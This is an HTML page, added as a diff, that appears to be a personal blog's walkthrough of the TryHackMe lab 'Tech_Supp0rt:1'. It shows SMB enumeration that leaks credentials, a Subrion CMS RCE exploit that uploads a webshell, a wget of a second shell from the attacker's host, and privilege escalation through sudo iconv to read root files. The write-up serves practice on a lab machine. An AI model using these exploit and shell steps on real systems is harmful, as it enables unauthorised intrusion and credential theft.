@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Tech_Support:1 | tudor.mindra</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Tech_Support:1" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="THM - Tech_Supp0rt:1" />
+<meta property="og:description" content="THM - Tech_Supp0rt:1" />
+<link rel="canonical" href="https://tudm99.github.io/techsupp1.html" />
+<meta property="og:url" content="https://tudm99.github.io/techsupp1.html" />
+<meta property="og:site_name" content="tudor.mindra" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Tech_Support:1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"THM - Tech_Supp0rt:1","headline":"Tech_Support:1","url":"https://tudm99.github.io/techsupp1.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9d81aa5ec0fd3d378905a6f5c775505f2ede6d9d">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Tech_Support:1</h1>
+      <h2 class="project-tagline">THM - Tech_Supp0rt:1</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h2 id="enumeration">Enumeration</h2>
+
+<p>Fired up nmap and gobuster.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for &lt;IP&gt;
+Host is up (0.067s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/wordpress       (Status: 301) [Size: 316]
+/test            (Status: 301) [Size: 311]
+/server-status   (Status: 403) [Size: 277]
+</code></pre></div></div>
+<h3 id="smb-enumeration">SMB Enumeration:</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Disk                            Permissions
+----                             -----------
+print$                            NO ACCESS
+websvr                            READ ONLY
+IPC$                              NO ACCESS
+</code></pre></div></div>
+<p>Before checking out the web pages, I’ll access the “websvr” share and see if there’s anything juicy inside.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N //&lt;IP&gt;/websvr
+
+smb: \&gt; ls
+  .                                   D        0  Sat May 29 10:17:38 2021
+  ..                                  D        0  Sat May 29 10:03:47 2021
+  enter.txt                           N      273  Sat May 29 10:17:38 2021
+
+                8460484 blocks of size 1024. 5693200 blocks available
+smb: \&gt; get enter.txt
+getting file \enter.txt of size 273 as enter.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
+smb: \&gt; exit
+
+cat enter.txt
+GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site, /subrion doesn't work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|-&gt;admin:[REDACTED] [cooked with magical formula]
+Wordpress creds
+|-&gt;
+</code></pre></div></div>
+
+<p>Now this is interesting. We found Subrion credentials. I’ll throw them into Cyberchef and see what pops up.</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/1.png" alt="CyberChef" /></p>
+
+<p>We now have the Subrion CMS admin credentials. Let’s look around on the website.</p>
+
+<p>first I tried accessing “/subrion”, but then, when it wasn’t working, I went backwards, and noticed the entry in “enter.txt”, which states that “/subrion”
+doesn’t work, and to use the panel. So i tried the next best thing. “/subrion/panel”.
+And what do you know! It worked!</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/2.png" alt="Subrion Panel" /></p>
+
+<p>Now, this CMS gracefully provided us with the version, so it won’t hurt looking for a CVE, right ?
+Bingo!
+CVE-2018-19422-SubrionCMS-RCE</p>
+
+<p>Let’s try logging in with the credentials we gathered, because the exploit requires authentication.</p>
+
+<p>(Meanwhile I also enumerated the wordpress site and found the user “support”. I’ll save it, maybe it’ll come in handy)</p>
+
+<p>Aaaand we logged in:</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/3.png" alt="Subrion Dash" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Let’s try the RCE.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 SubrionRCE.py -u http://&lt;IP&gt;/subrion/panel/ -l admin -p [REDACTED]
+[+] Trying to connect to: http://&lt;IP&gt;/subrion/panel/
+[+] Success!
+[+] Got CSRF token: [REDACTED]
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: mwfyhhiowaujnqk
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://&lt;IP&gt;/subrion/panel/uploads/mwfyhhiowaujnqk.phar
+
+$ whoami
+www-data
+</code></pre></div></div>
+<p>I then uploaded another shell, because this one is a bit funky, and upgraded using a python TTY</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.18.116.220:8000/shell.php
+
+$ ls
+mwfyhhiowaujnqk.phar
+shell.php
+zrqcdnixvfcwxop.phar
+
+$ php shell.php
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@TechSupport:/$
+</code></pre></div></div>
+<p>We cd into the /opt directory, empty.</p>
+
+<p>Cd into the /home directory, there’s the scamsite directory with the “enter.txt” file we found earlier.</p>
+
+<p>So i’ll start looking for SUID binaries, since we don’t have sudo permissions.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre></div></div>
+<p>No luck there, so we start snooping around. You can check default locations, or you can use linpeas.</p>
+
+<p>I opted for linpeas.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html/wordpress/wp-config.php
+define( 'DB_NAME', 'wpdb' );
+define( 'DB_USER', 'support' );
+define( 'DB_PASSWORD', '[REDACTED]' );
+define( 'DB_HOST', 'localhost' );
+</code></pre></div></div>
+<p>And what do you know, it found a pasword for the user “support”. I’ll try to ssh into the machine using the “scamsite” user that we found, and this password.</p>
+
+<p>Aaand it worked.</p>
+
+<p>Let’s see what we can do from this user. First of all, I’m gonna ssh into the machine for a more stable shell.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation:</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scamsite@TechSupport:~$ sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv
+</code></pre></div></div>
+<p>scamsite may use iconv to read files. We could use it to read and crack the /etc/shadow file, or the id_rsa from the root folder. But that’s not necessary for proof of completion, so we’ll just read “/root/root.txt”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LFILE=/root/root.txt
+sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
+</code></pre></div></div>
+<p>And we got the flag!</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/4.png" alt="Flag" /></p>
+
+<p>Good hunting o7</p>
+
+<p><a href="https://tryhackme.com/room/techsupp0rt1">Try it out yourself!</a></p>
+
+<script src="https://platform.linkedin.com/in.js" type="text/javascript">lang: en_US</script>
+<script type="IN/Share" data-url="https://www.linkedin.com"></script>
+
+<p><a href="./">back</a></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
